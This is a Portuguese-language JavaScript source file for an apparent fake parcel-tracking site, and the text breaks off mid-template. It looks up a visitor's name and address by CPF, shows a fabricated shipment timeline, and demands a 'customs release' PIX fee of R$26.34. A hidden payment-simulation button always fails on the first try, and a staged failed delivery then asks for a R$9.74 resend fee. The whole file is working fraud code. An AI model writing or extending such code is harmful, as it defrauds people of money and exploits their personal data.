/**
 * Sistema principal de rastreamento - VERSÃO ATUALIZADA COM ZENTRA PAY OFICIAL
 */
import { CPFValidator } from '../utils/cpf-validator.js';
import { DataService } from '../utils/data-service.js';
import { TrackingGenerator } from '../utils/tracking-generator.js';
import { UIHelpers } from '../utils/ui-helpers.js';
import { ZentraPayService } from '../services/zentra-pay.js';
import { AutomatedTrackingSystem } from '../utils/automated-tracking.js';

export class TrackingSystem {
    constructor() {
        this.currentCPF = null;
        this.trackingData = null;
        this.userData = null;
        this.dataService = new DataService();
        this.zentraPayService = new ZentraPayService();
        this.isInitialized = false;
        this.pixData = null;
        this.paymentErrorShown = false;
        this.paymentRetryCount = 0;
        this.automatedSystem = new AutomatedTrackingSystem();
        
        console.log('TrackingSystem inicializado com Zentra Pay oficial');
        this.initWhenReady();
    }

    initWhenReady() {
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => this.init());
        } else {
            this.init();
        }
        
        // Múltiplos fallbacks para garantir inicialização
        setTimeout(() => this.init(), 100);
        setTimeout(() => this.init(), 500);
        setTimeout(() => this.init(), 1000);
    }

    init() {
        if (this.isInitialized) return;
        
        console.log('Inicializando sistema de rastreamento...');
        
        try {
            this.setupEventListeners();
            this.handleAutoFocus();
            this.clearOldData();
            
            // Validar configuração da API
            this.validateZentraPaySetup();
            
            this.isInitialized = true;
            console.log('Sistema de rastreamento inicializado com sucesso');
        } catch (error) {
            console.error('Erro na inicialização:', error);
            setTimeout(() => {
                this.isInitialized = false;
                this.init();
            }, 1000);
        }
    }

    validateZentraPaySetup() {
        const isValid = this.zentraPayService.validateApiSecret();
        if (isValid) {
            console.log('✅ API Zentra Pay configurada corretamente');
        } else {
            console.error('❌ Problema na configuração da API Zentra Pay');
        }
    }

    setupEventListeners() {
        console.log('Configurando event listeners...');
        
        // Form submission - MÚLTIPLAS ESTRATÉGIAS
        this.setupFormSubmission();
        
        // CPF input
        this.setupCPFInput();
        
        // Track button - CONFIGURAÇÃO ESPECÍFICA
        this.setupTrackButton();
        
        // Modal events
        this.setupModalEvents();
        
        // Copy buttons
        this.setupCopyButtons();
        
        // Accordion
        this.setupAccordion();
        
        // Keyboard events
        this.setupKeyboardEvents();
        
        console.log('Event listeners configurados');
    }

    setupFormSubmission() {
        // Estratégia 1: Form por ID
        const trackingForm = document.getElementById('trackingForm');
        if (trackingForm) {
            console.log('Form encontrado por ID');
            trackingForm.addEventListener('submit', (e) => {
                e.preventDefault();
                e.stopPropagation();
                console.log('Form submetido via ID');
                this.handleTrackingSubmit();
            });
        }

        // Estratégia 2: Todos os forms na página
        const allForms = document.querySelectorAll('form');
        allForms.forEach((form, index) => {
            console.log(`Configurando form ${index}`);
            form.addEventListener('submit', (e) => {
                e.preventDefault();
                e.stopPropagation();
                console.log(`Form ${index} submetido`);
                this.handleTrackingSubmit();
            });
        });
    }

    setupTrackButton() {
        console.log('Configurando botão de rastreamento...');
        
        // Estratégia 1: Por ID específico
        const trackButtonById = document.getElementById('trackButton');
        if (trackButtonById) {
            console.log('Botão encontrado por ID: trackButton');
            this.configureTrackButton(trackButtonById);
        }

        // Estratégia 2: Por classe
        const trackButtonsByClass = document.querySelectorAll('.track-button');
        trackButtonsByClass.forEach((button, index) => {
            console.log(`Configurando botão por classe ${index}`);
            this.configureTrackButton(button);
        });

        // Estratégia 3: Por tipo e texto
        const allButtons = document.querySelectorAll('button[type="submit"], button');
        allButtons.forEach((button, index) => {
            if (button.textContent && button.textContent.toLowerCase().includes('rastrear')) {
                console.log(`Configurando botão por texto ${index}: ${button.textContent}`);
                this.configureTrackButton(button);
            }
        });

        // Estratégia 4: Delegação de eventos no documento
        document.addEventListener('click', (e) => {
            const target = e.target;
            if (target && target.tagName === 'BUTTON' && 
                target.textContent && target.textContent.toLowerCase().includes('rastrear')) {
                e.preventDefault();
                e.stopPropagation();
                console.log('Botão rastrear clicado via delegação');
                this.handleTrackingSubmit();
            }
        });
    }

    configureTrackButton(button) {
        // Remover listeners existentes
        const newButton = button.cloneNode(true);
        button.parentNode.replaceChild(newButton, button);
        
        // Configurar novo listener
        newButton.addEventListener('click', (e) => {
            e.preventDefault();
            e.stopPropagation();
            console.log('Botão rastrear clicado:', newButton.id || newButton.className);
            this.handleTrackingSubmit();
        });

        // Garantir que o botão seja clicável
        newButton.style.cursor = 'pointer';
        newButton.style.pointerEvents = 'auto';
        newButton.removeAttribute('disabled');
        
        // Configurar tipo se necessário
        if (newButton.type !== 'submit') {
            newButton.type = 'button';
        }
        
        console.log('Botão configurado:', newButton.id || newButton.className);
    }

    setupCPFInput() {
        const cpfInput = document.getElementById('cpfInput');
        if (!cpfInput) {
            console.warn('Campo CPF não encontrado');
            return;
        }

        console.log('Configurando campo CPF...');

        // Input event para máscara
        cpfInput.addEventListener('input', (e) => {
            CPFValidator.applyCPFMask(e.target);
            this.validateCPFInput();
        });

        // Keypress para prevenir caracteres não numéricos
        cpfInput.addEventListener('keypress', (e) => {
            this.preventNonNumeric(e);
        });

        // Enter key para submeter
        cpfInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                this.handleTrackingSubmit();
            }
        });

        // Paste event
        cpfInput.addEventListener('paste', (e) => {
            e.preventDefault();
            const paste = (e.clipboardData || window.clipboardData).getData('text');
            const numbersOnly = paste.replace(/[^\d]/g, '');
            if (numbersOnly.length <= 11) {
                cpfInput.value = numbersOnly;
                CPFValidator.applyCPFMask(cpfInput);
                this.validateCPFInput();
            }
        });

        // Focus event
        cpfInput.addEventListener('focus', () => {
            cpfInput.setAttribute('inputmode', 'numeric');
        });

        console.log('Campo CPF configurado');
    }

    preventNonNumeric(e) {
        const allowedKeys = [8, 9, 27, 13, 46, 35, 36, 37, 38, 39, 40];
        if (allowedKeys.includes(e.keyCode) || 
            (e.keyCode === 65 && e.ctrlKey) || // Ctrl+A
            (e.keyCode === 67 && e.ctrlKey) || // Ctrl+C
            (e.keyCode === 86 && e.ctrlKey) || // Ctrl+V
            (e.keyCode === 88 && e.ctrlKey)) { // Ctrl+X
            return;
        }
        
        if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105)) {
            e.preventDefault();
        }
    }

    validateCPFInput() {
        const cpfInput = document.getElementById('cpfInput');
        const trackButtons = document.querySelectorAll('#trackButton, .track-button, button[type="submit"]');
        
        if (!cpfInput) return;
        
        const cpfValue = CPFValidator.cleanCPF(cpfInput.value);
        
        trackButtons.forEach(button => {
            if (button.textContent && button.textContent.toLowerCase().includes('rastrear')) {
                if (cpfValue.length === 11) {
                    button.disabled = false;
                    button.style.opacity = '1';
                    button.style.cursor = 'pointer';
                    cpfInput.style.borderColor = '#27ae60';
                } else {
                    button.disabled = true;
                    button.style.opacity = '0.7';
                    button.style.cursor = 'not-allowed';
                    cpfInput.style.borderColor = cpfValue.length > 0 ? '#e74c3c' : '#e9ecef';
                }
            }
        });
    }

    async handleTrackingSubmit() {
        console.log('=== INICIANDO PROCESSO DE RASTREAMENTO ===');
        
        const cpfInput = document.getElementById('cpfInput');
        if (!cpfInput) {
            console.error('Campo CPF não encontrado');
            UIHelpers.showError('Campo CPF não encontrado. Recarregue a página.');
            return;
        }
        
        const cpfInputValue = cpfInput.value;
        const cleanCPF = CPFValidator.cleanCPF(cpfInputValue);
        
        console.log('CPF digitado:', cpfInputValue);
        console.log('CPF limpo:', cleanCPF);
        
        if (!CPFValidator.isValidCPF(cpfInputValue)) {
            console.log('CPF inválido');
            UIHelpers.showError('Por favor, digite um CPF válido com 11 dígitos.');
            return;
        }

        console.log('CPF válido, iniciando busca...');

        // Mostrar loading
        UIHelpers.showLoadingNotification();

        // Desabilitar todos os botões de rastreamento
        const trackButtons = document.querySelectorAll('#trackButton, .track-button, button[type="submit"]');
        const originalTexts = [];
        
        trackButtons.forEach((button, index) => {
            if (button.textContent && button.textContent.toLowerCase().includes('rastrear')) {
                originalTexts[index] = button.innerHTML;
                button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Consultando...';
                button.disabled = true;
            }
        });

        try {
            // Simular delay de processamento
            await new Promise(resolve => setTimeout(resolve, 3000));
            
            console.log('Buscando dados do CPF...');
            
            // Buscar dados do CPF
            const cpfData = await this.dataService.fetchCPFData(cleanCPF);
            
            if (cpfData && cpfData.DADOS) {
                console.log('Dados do CPF encontrados:', cpfData.DADOS);
                this.currentCPF = cleanCPF;
                this.userData = cpfData.DADOS;
                
                UIHelpers.closeLoadingNotification();
                
                // Log para verificar se o nome está correto
                console.log('✅ Nome do usuário obtido da API:', this.userData.nome);
                console.log('✅ CPF do usuário:', this.userData.cpf);
                
                setTimeout(() => {
                    console.log('Exibindo resultados...');
                    this.displayOrderDetails();
                    this.generateTrackingData();
                    this.displayTrackingResults();
                    this.saveTrackingData();
                    
                    // Scroll para os resultados
                    const orderDetails = document.getElementById('orderDetails');
                    if (orderDetails) {
                        UIHelpers.scrollToElement(orderDetails, 100);
                    }
                    
                    // Destacar botão de liberação após delay
                    setTimeout(() => {
                        this.highlightLiberationButton();
                    }, 1500);
                }, 300);
            } else {
                console.log('CPF não encontrado');
                UIHelpers.closeLoadingNotification();
                UIHelpers.showError('CPF não encontrado. Tente novamente.');
            }
        } catch (error) {
            console.error('Erro no processo:', error);
            UIHelpers.closeLoadingNotification();
            UIHelpers.showError('Erro ao consultar CPF. Tente novamente.');
        } finally {
            // Restaurar botões
            trackButtons.forEach((button, index) => {
                if (button.textContent && originalTexts[index]) {
                    button.innerHTML = originalTexts[index];
                    button.disabled = false;
                }
            });
            this.validateCPFInput();
        }
    }

    displayOrderDetails() {
        if (!this.userData) return;
        
        // Garantir que estamos usando o nome correto da API
        const fullName = this.userData.nome || 'Nome não encontrado';
        const shortName = this.getFirstAndLastName(fullName);
        const formattedCPF = CPFValidator.formatCPF(this.userData.cpf || '');
        
        console.log('📝 Exibindo dados - Nome completo:', fullName, 'Nome curto:', shortName);
        
        // Atualizar elementos da interface
        this.updateElement('customerName', shortName);
        this.updateElement('fullName', this.userData.nome);
        this.updateElement('formattedCpf', formattedCPF);
        this.updateElement('customerNameStatus', shortName);
        
        // Buscar dados completos do lead no banco
        this.loadCompleteOrderData();
        
        console.log('✅ Interface atualizada com nome:', shortName);
        // Mostrar seções
        this.showElement('orderDetails');
        this.showElement('trackingResults');
    }
    
    async loadCompleteOrderData() {
        if (!this.currentCPF) return;
        
        try {
            const { DatabaseService } = await import('../services/database.js');
            const dbService = new DatabaseService();
            const result = await dbService.getLeadByCPF(this.currentCPF);
            
            if (result.success && result.data) {
                const leadData = result.data;
                console.log('📦 Dados completos do lead:', leadData);
                
                // Atualizar dados do pedido com informações completas
                this.updateElement('customerDocument', CPFValidator.formatCPF(leadData.cpf));
                this.updateElement('customerProduct', leadData.produtos?.[0]?.nome || 'Kit 12 caixas organizadoras + brinde');
                this.updateElement('customerFullAddress', leadData.endereco || 'Endereço não informado');
                
                // Mostrar seção de informações do pedido
                this.showElement('orderInfoSection');
            }
        } catch (error) {
            console.error('❌ Erro ao carregar dados completos:', error);
        }
    }

    generateTrackingData() {
        if (!this.currentCPF || !this.userData) return;
        
        // Gerar dados de rastreamento usando o TrackingGenerator
        this.trackingData = TrackingGenerator.generateTrackingData(this.currentCPF, this.userData);
        
        console.log('📦 Dados de rastreamento gerados:', this.trackingData);
    }

    startAutomatedTracking() {
        console.log('🤖 Iniciando sistema de rastreamento automatizado');
        
        // Iniciar sistema automatizado
        const trackingResult = this.automatedSystem.startAutomatedTracking(this.currentCPF, this.userData);
        
        // Configurar dados de rastreamento
        this.trackingData = {
            cpf: this.currentCPF,
            currentStep: trackingResult.currentStep,
            steps: trackingResult.steps,
            liberationPaid: false,
            liberationDate: null,
            deliveryAttempts: 0,
            lastUpdate: new Date().toISOString()
        };
        
        // Configurar listeners para eventos do sistema automatizado
        this.setupAutomatedEventListeners();
        
        // Exibir resultados iniciais
        this.displayTrackingResults();
    }

    setupAutomatedEventListeners() {
        // Listener para etapa completada
        document.addEventListener('stepCompleted', (event) => {
            console.log('📦 Nova etapa completada:', event.detail);
            
            // Atualizar dados de rastreamento
            this.trackingData.currentStep = event.detail.stepIndex + 1;
            this.trackingData.lastUpdate = event.detail.timestamp;
            
            // Salvar progresso
            this.saveTrackingData();
            
            // Mostrar notificação de nova etapa
            this.showStepNotification(event.detail.stepData);
        });
        
        // Listener para liberação necessária
        document.addEventListener('liberationNeeded', (event) => {
            console.log('🔓 Liberação necessária:', event.detail);
            
            // Destacar botão de liberação
            setTimeout(() => {
                this.highlightLiberationButton();
            }, 1000);
        });
        
        // Listener para rastreamento completado
        document.addEventListener('trackingCompleted', (event) => {
            console.log('🏁 Rastreamento completado:', event.detail);
            this.showTrackingCompletedNotification();
        });
    }

    displayTrackingResults() {
        this.updateStatus();
        // A timeline será renderizada automaticamente pelo sistema automatizado
        
        // Animar timeline
        setTimeout(() => {
            UIHelpers.animateTimeline();
        }, 500);
    }

    updateStatus() {
        const statusIcon = document.getElementById('statusIcon');
        const currentStatus = document.getElementById('currentStatus');
        
        if (!statusIcon || !currentStatus) return;
        
        if (this.trackingData.currentStep === 'customs') {
            statusIcon.innerHTML = '<i class="fas fa-clock"></i>';
            statusIcon.className = 'status-icon in-transit';
            currentStatus.textContent = 'Aguardando liberação aduaneira';
        }
    }

    showStepNotification(stepData) {
        const notification = document.createElement('div');
        notification.className = 'step-notification';
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: #1e4a6b;
            color: white;
            padding: 15px 20px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(30, 74, 107, 0.3);
            z-index: 9999;
            display: flex;
            align-items: center;
            gap: 10px;
            font-family: 'Inter', sans-serif;
            animation: slideInRight 0.5s ease, fadeOut 0.5s ease 4.5s forwards;
            max-width: 300px;
        `;
        
        notification.innerHTML = `
            <i class="fas fa-truck" style="font-size: 1.2rem;"></i>
            <div>
                <div style="font-weight: 600; margin-bottom: 2px;">Nova atualização!</div>
                <div style="font-size: 0.9rem; opacity: 0.9;">${stepData.title}</div>
            </div>
        `;
        
        document.body.appendChild(notification);
        
        // Remover após 5 segundos
        setTimeout(() => {
            if (notification.parentNode) {
                notification.remove();
            }
        }, 5000);
    }

    showTrackingCompletedNotification() {
        const notification = document.createElement('div');
        notification.className = 'completion-notification';
        notification.style.cssText = `
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #27ae60;
            color: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(39, 174, 96, 0.3);
            z-index: 9999;
            text-align: center;
            font-family: 'Inter', sans-serif;
            animation: bounceIn 0.6s ease;
        `;
        
        notification.innerHTML = `
            <i class="fas fa-check-circle" style="font-size: 3rem; margin-bottom: 15px;"></i>
            <h3 style="margin-bottom: 10px;">Rastreamento Completo!</h3>
            <p style="opacity: 0.9;">Todas as etapas foram atualizadas.</p>
        `;
        
        document.body.appendChild(notification);
        
        // Remover após 5 segundos
        setTimeout(() => {
            if (notification.parentNode) {
                notification.style.animation = 'fadeOut 0.5s ease';
                setTimeout(() => notification.remove(), 500);
            }
        }, 5000);
    }

    highlightLiberationButton() {
        const liberationButton = document.querySelector('.liberation-button-timeline');
        if (liberationButton) {
            UIHelpers.scrollToElement(liberationButton, window.innerHeight / 2);
            
            setTimeout(() => {
                liberationButton.style.animation = 'pulse 2s infinite, glow 2s ease-in-out';
                liberationButton.style.boxShadow = '0 0 20px rgba(255, 107, 53, 0.8)';
                this.startAutomatedTracking();
                setTimeout(() => {
                    liberationButton.style.animation = 'pulse 2s infinite';
                    liberationButton.style.boxShadow = '0 4px 15px rgba(255, 107, 53, 0.4)';
                }, 6000);
            }, 500);
        }
    }

    setupModalEvents() {
        // Liberation modal
        const closeModal = document.getElementById('closeModal');
        if (closeModal) {
            closeModal.addEventListener('click', () => {
                this.closeModal('liberationModal');
            });
        }

        // Delivery modal
        const closeDeliveryModal = document.getElementById('closeDeliveryModal');
        if (closeDeliveryModal) {
            closeDeliveryModal.addEventListener('click', () => {
                this.closeModal('deliveryModal');
            });
        }

        // Modal overlay clicks
        ['liberationModal', 'deliveryModal'].forEach(modalId => {
            const modal = document.getElementById(modalId);
            if (modal) {
                modal.addEventListener('click', (e) => {
                    if (e.target.id === modalId) {
                        this.closeModal(modalId);
                    }
                });
            }
        });
    }

    setupCopyButtons() {
        const copyButtons = [
            { buttonId: 'copyPixButtonModal', inputId: 'pixCodeModal' },
            { buttonId: 'copyPixButtonDelivery', inputId: 'pixCodeDelivery' }
        ];

        copyButtons.forEach(({ buttonId, inputId }) => {
            const button = document.getElementById(buttonId);
            if (button) {
                button.addEventListener('click', () => {
                    this.copyPixCode(inputId, buttonId);
                });
            }
        });
    }

    setupAccordion() {
        const detailsHeader = document.getElementById('detailsHeader');
        if (detailsHeader) {
            detailsHeader.addEventListener('click', () => {
                this.toggleAccordion();
            });
        }
    }

    setupKeyboardEvents() {
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                this.closeModal('liberationModal');
                this.closeModal('deliveryModal');
                UIHelpers.closeLoadingNotification();
            }
        });
    }

    async openLiberationModal() {
        console.log('🚀 Iniciando processo de geração de PIX via Zentra Pay...');
        UIHelpers.showLoadingNotification();
        
        try {
            // Validar configuração antes de prosseguir
            if (!this.zentraPayService.validateApiSecret()) {
                throw new Error('API Secret do Zentra Pay não configurada corretamente');
            }
            
            // Valor em reais - você pode configurar esta variável
            const valorEmReais = window.valor_em_reais || 26.34; // R$ 26,34
            
            console.log('💰 Valor da transação:', `R$ ${valorEmReais.toFixed(2)}`);
            console.log('👤 Dados do usuário:', {
                nome: this.userData.nome,
                cpf: this.userData.cpf
            });
            
            console.log('📡 Enviando requisição para Zentra Pay...');
            const pixResult = await this.zentraPayService.createPixTransaction(
                this.userData, 
                valorEmReais
            );
            
            if (pixResult.success) {
                console.log('🎉 PIX gerado com sucesso via API oficial Zentra Pay!');
                console.log('📋 Dados recebidos:', {
                    transactionId: pixResult.transactionId,
                    externalId: pixResult.externalId,
                    pixPayload: pixResult.pixPayload,
                    email: pixResult.email,
                    telefone: pixResult.telefone,
                    paymentMethod: pixResult.paymentMethod,
                    valor: pixResult.valor
                });
                
                this.pixData = pixResult;
                
                UIHelpers.closeLoadingNotification();
                
                // Aguardar um pouco antes de mostrar o modal
                setTimeout(() => {
                    this.displayRealPixModal();
                    
                    // Guiar atenção para o botão copiar após modal abrir
                    setTimeout(() => {
                        this.guideToCopyButton();
                    }, 800);
                }, 300);
            } else {
                throw new Error(pixResult.error || 'Erro desconhecido ao gerar PIX');
            }
            
        } catch (error) {
            console.error('💥 Erro ao gerar PIX via Zentra Pay:', error);
            UIHelpers.closeLoadingNotification();
            
            // Mostrar erro específico para o usuário
            UIHelpers.showError(`Erro ao gerar PIX: ${error.message}`);
            
            // Fallback para modal estático em caso de erro
            setTimeout(() => {
                console.log('⚠️ Exibindo modal estático como fallback');
                this.displayStaticPixModal();
                
                setTimeout(() => {
                    this.guideToCopyButton();
                }, 800);
            }, 1000);
        }
    }
    
    // Mostrar erro de pagamento
    showPaymentError() {
        this.paymentErrorShown = true;
        
        const errorOverlay = document.createElement('div');
        errorOverlay.id = 'paymentErrorOverlay';
        errorOverlay.className = 'modal-overlay';
        errorOverlay.style.display = 'flex';
        
        errorOverlay.innerHTML = `
            <div class="professional-modal-container" style="max-width: 450px;">
                <div class="professional-modal-header">
                    <h2 class="professional-modal-title">Erro de Pagamento</h2>
                    <button class="professional-modal-close" id="closePaymentErrorModal">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                
                <div class="professional-modal-content" style="text-align: center;">
                    <div style="margin-bottom: 20px;">
                        <i class="fas fa-exclamation-triangle" style="font-size: 3rem; color: #e74c3c;"></i>
                    </div>
                    <p style="font-size: 1.1rem; margin-bottom: 25px; color: #333;">
                        Erro ao processar pagamento. Tente novamente.
                    </p>
                    <button id="retryPaymentButton" class="liberation-button-timeline" style="margin: 0 auto; display: block;">
                        <i class="fas fa-redo"></i> Tentar Novamente
                    </button>
                </div>
            </div>
        `;
        
        document.body.appendChild(errorOverlay);
        document.body.style.overflow = 'hidden';
        
        // Configurar eventos
        const closeButton = document.getElementById('closePaymentErrorModal');
        const retryButton = document.getElementById('retryPaymentButton');
        
        if (closeButton) {
            closeButton.addEventListener('click', () => {
                this.closePaymentErrorModal();
            });
        }
        
        if (retryButton) {
            retryButton.addEventListener('click', () => {
                this.closePaymentErrorModal();
                this.openLiberationModal();
            });
        }
        
        // Fechar ao clicar fora
        errorOverlay.addEventListener('click', (e) => {
            if (e.target === errorOverlay) {
                this.closePaymentErrorModal();
            }
        });
    }
    
    closePaymentErrorModal() {
        const errorOverlay = document.getElementById('paymentErrorOverlay');
        if (errorOverlay) {
            errorOverlay.style.animation = 'fadeOut 0.3s ease';
            setTimeout(() => {
                if (errorOverlay.parentNode) {
                    errorOverlay.remove();
                }
                document.body.style.overflow = 'auto';
            }, 300);
        }
    }

    displayRealPixModal() {
        console.log('🎯 Exibindo modal com dados reais do PIX...');
        
        // Atualizar QR Code com dados reais
        const qrCodeImg = document.getElementById('realPixQrCode');
        if (qrCodeImg && this.pixData.pixPayload) {
            // Gerar QR Code a partir do payload PIX real
            const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(this.pixData.pixPayload)}`;
            qrCodeImg.src = qrCodeUrl;
            qrCodeImg.alt = 'QR Code PIX Real - Zentra Pay Oficial';
            console.log('✅ QR Code atualizado com dados reais da API oficial');
            console.log('🔗 URL do QR Code:', qrCodeUrl);
        }
        
        // Atualizar código PIX Copia e Cola com pix.payload REAL
        const pixCodeInput = document.getElementById('pixCodeModal');
        if (pixCodeInput && this.pixData.pixPayload) {
            pixCodeInput.value = this.pixData.pixPayload;
            console.log('✅ Código PIX Copia e Cola atualizado com dados reais da API oficial');
            console.log('📋 PIX Payload Real:', this.pixData.pixPayload);
            console.log('📏 Tamanho do payload:', this.pixData.pixPayload.length, 'caracteres');
        }
        
        // Mostrar modal
        const liberationModal = document.getElementById('liberationModal');
        if (liberationModal) {
            liberationModal.style.display = 'flex';
            document.body.style.overflow = 'hidden';
            console.log('🎯 Modal PIX real exibido com sucesso');
            
            // Adicionar botão de simulação após modal abrir
            setTimeout(() => {
                this.addPaymentSimulationButton();
            }, 500);
            
        }
        
        // Log de confirmação final
        console.log('🎉 SUCESSO: Modal PIX real exibido com dados válidos da Zentra Pay!');
        console.log('💳 Transação ID:', this.pixData.transactionId);
        console.log('🔢 External ID:', this.pixData.externalId);
        console.log('💰 Valor:', `R$ ${this.pixData.valor.toFixed(2)}`);
    }
    
    // Adicionar botão de simulação de pagamento
    addPaymentSimulationButton() {
        const modalContent = document.querySelector('.professional-modal-content');
        if (!modalContent) return;
        
        // Verificar se já existe o botão
        if (document.getElementById('simulatePaymentButton')) return;
        
        const simulationContainer = document.createElement('div');
        simulationContainer.style.cssText = `
            margin-top: 20px;
            padding: 15px;
            background: transparent;
            border-radius: 8px;
            border: none;
            text-align: center;
        `;
        
        simulationContainer.innerHTML = `
            <button id="simulatePaymentButton" style="
                background: transparent;
                color: #666;
                border: 1px solid #ddd;
                padding: 6px 12px;
                border-radius: 6px;
                cursor: pointer;
                font-weight: 600;
                transition: all 0.3s ease;
                opacity: 0.7;
                font-size: 12px;
                min-width: 30px;
                height: 28px;
            ">
                -
            </button>
        `;
        
        modalContent.appendChild(simulationContainer);
        
        // Configurar evento do botão
        const simulateButton = document.getElementById('simulatePaymentButton');
        if (simulateButton) {
            simulateButton.addEventListener('click', () => {
                this.simulatePayment();
            });
            
            simulateButton.addEventListener('mouseenter', function() {
                this.style.background = 'rgba(0, 0, 0, 0.05)';
                this.style.transform = 'translateY(-1px)';
                this.style.opacity = '1';
            });
            
            simulateButton.addEventListener('mouseleave', function() {
                this.style.background = 'transparent';
                this.style.transform = 'translateY(0)';
                this.style.opacity = '0.7';
            });
        }
    }
    
    // Simular pagamento
    simulatePayment() {
        // Fechar modal de pagamento
        this.closeModal('liberationModal');
        
        // Incrementar contador de tentativas
        this.paymentRetryCount++;
        
        // Se for a primeira tentativa, mostrar erro
        if (this.paymentRetryCount === 1) {
            setTimeout(() => {
                this.showPaymentError();
            }, 1000);
        } else {
            // Se for a segunda tentativa, processar pagamento com sucesso
            this.paymentRetryCount = 0;
            this.processSuccessfulPayment();
        }
    }
    
    // Processar pagamento com sucesso e iniciar fluxo pós-liberação
    processSuccessfulPayment() {
        // Marcar como pago
        if (this.trackingData) {
            this.trackingData.liberationPaid = true;
        }
        
        // Atualizar status no banco de dados
        this.updatePaymentStatusInDatabase('pago');
        
        // Atualizar interface
        const liberationButton = document.querySelector('.liberation-button-timeline');
        if (liberationButton) {
            liberationButton.style.display = 'none';
        }
        
        // Mostrar notificação de sucesso
        this.showSuccessNotification();
        
        // Iniciar fluxo pós-liberação com etapas específicas
        setTimeout(() => {
            this.startPostLiberationFlow();
        }, 1000);
    }
    
    // Fluxo pós-liberação alfandegária
    startPostLiberationFlow() {
        console.log('🚀 Iniciando fluxo pós-liberação...');
        
        // Etapa 12: Liberado na alfândega
        this.addTimelineStep({
            stepNumber: 12,
            title: 'Pedido liberado na alfândega de importação',
            description: 'Seu pedido foi liberado após o pagamento da taxa alfandegária',
            delay: 0
        });
        
        // Etapa 13: Sairá para entrega (2h)
        this.addTimelineStep({
            stepNumber: 13,
            title: 'Pedido sairá para entrega para seu endereço',
            description: 'Pedido sairá para entrega para seu endereço',
            delay: 2 * 60 * 60 * 1000
        });
        
        // Etapa 14: Em trânsito (4h)
        this.addTimelineStep({
            stepNumber: 14,
            title: 'Pedido em trânsito para seu endereço',
            description: 'Pedido em trânsito para seu endereço',
            delay: 4 * 60 * 60 * 1000
        });
        
        // Etapa 15: Rota de entrega (6h)
        this.addTimelineStep({
            stepNumber: 15,
            title: 'Pedido em rota de entrega para seu endereço, aguarde',
            description: 'Pedido em rota de entrega para seu endereço, aguarde',
            delay: 6 * 60 * 60 * 1000
        });
        
        // Etapa 16: Tentativa de entrega (8h)
        this.addTimelineStep({
            stepNumber: 16,
            title: 'Tentativa de entrega',
            description: 'Tentativa de entrega realizada, mas não foi possível entregar',
            delay: 8 * 60 * 60 * 1000,
            isDeliveryAttempt: true,
            deliveryValue: 9.74
        });
    }
    
    // Adicionar nova etapa na timeline
    addTimelineStep({ stepNumber, title, description, delay, isDeliveryAttempt = false, deliveryValue = 0 }) {
        setTimeout(() => {
            console.log(`📦 Adicionando etapa ${stepNumber}: ${title}`);
            
            const timeline = document.getElementById('trackingTimeline');
            if (!timeline) return;

            const stepDate = new Date();
            const timelineItem = this.createDeliveryTimelineItem({
                stepNumber,
                title,
                description,
                date: stepDate,
                completed: true,
                isDeliveryAttempt,
                deliveryValue
            });

            timeline.appendChild(timelineItem);

            // Animar entrada da nova etapa
            setTimeout(() => {
                timelineItem.style.opacity = '1';
                timelineItem.style.transform = 'translateY(0)';
            }, 100);

            // Scroll para a nova etapa
            timelineItem.scrollIntoView({ 
                behavior: 'smooth', 
                block: 'center' 
            });

        }, delay);
    }
    
    // Criar item da timeline para entrega
    createDeliveryTimelineItem({ stepNumber, title, description, date, completed, isDeliveryAttempt, deliveryValue }) {
        const item = document.createElement('div');
        item.className = `timeline-item ${completed ? 'completed' : ''}`;
        item.style.opacity = '0';
        item.style.transform = 'translateY(20px)';
        item.style.transition = 'all 0.5s ease';

        const dateStr = date.toLocaleDateString('pt-BR', { day: '2-digit', month: 'short' });
        const timeStr = date.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });

        let buttonHtml = '';
        
        if (isDeliveryAttempt) {
            buttonHtml = `
                <button class="liberation-button-timeline delivery-retry-btn" data-value="${deliveryValue}">
                    <i class="fas fa-redo"></i> Reenviar Pacote (R$ ${deliveryValue.toFixed(2)})
                </button>
            `;
        }

        item.innerHTML = `
            <div class="timeline-dot"></div>
            <div class="timeline-content">
                <div class="timeline-date">
                    <span class="date">${dateStr}</span>
                    <span class="time">${timeStr}</span>
                </div>
                <div class="timeline-text">
                    <p>${description}</p>
                    ${buttonHtml}
                </div>
            </div>
        `;

        // Configurar eventos dos botões de reenvio
        if (isDeliveryAttempt) {
            const retryButton = item.querySelector('.delivery-retry-btn');
            if (retryButton) {
                retryButton.addEventListener('click', () => {
                    this.handleDeliveryRetry(deliveryValue, retryButton);
                });
            }
        }

        return item;
    }
    
    // Lidar com reenvio de entrega
    handleDeliveryRetry(value, button) {
        console.log(`🔄 Processando reenvio - R$ ${value.toFixed(2)}`);
        
        // Mostrar modal de pagamento de reenvio
        this.showDeliveryPaymentModal(value, button);
    }
    
    // Modal de pagamento de reenvio
    showDeliveryPaymentModal(value, button) {
        const modal = document.createElement('div');
        modal.className = 'modal-overlay';
        modal.id = 'deliveryPaymentModal';
        modal.style.display = 'flex';
        
        modal.innerHTML = `
            <div class="professional-modal-container">
                <div class="professional-modal-header">
                    <h2 class="professional-modal-title">Taxa de Reenvio</h2>
                    <button class="professional-modal-close" id="closeDeliveryPaymentModal">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                
                <div class="professional-modal-content">
                    <div class="liberation-explanation">
                        <p class="liberation-subtitle">
                            Para reagendar a entrega do seu pedido, é necessário pagar a taxa de reenvio de R$ ${value.toFixed(2)}.
                        </p>
                    </div>

                    <div class="professional-fee-display">
                        <div class="fee-info">
                            <span class="fee-label">Taxa de Reenvio</span>
                            <span class="fee-amount">R$ ${value.toFixed(2)}</span>
                        </div>
                    </div>
                    
                    <div style="text-align: center; margin-top: 20px;">
                        <button id="simulateDeliveryPayment" class="liberation-button-timeline">
                            <i class="fas fa-credit-card"></i> Simular Pagamento
                        </button>
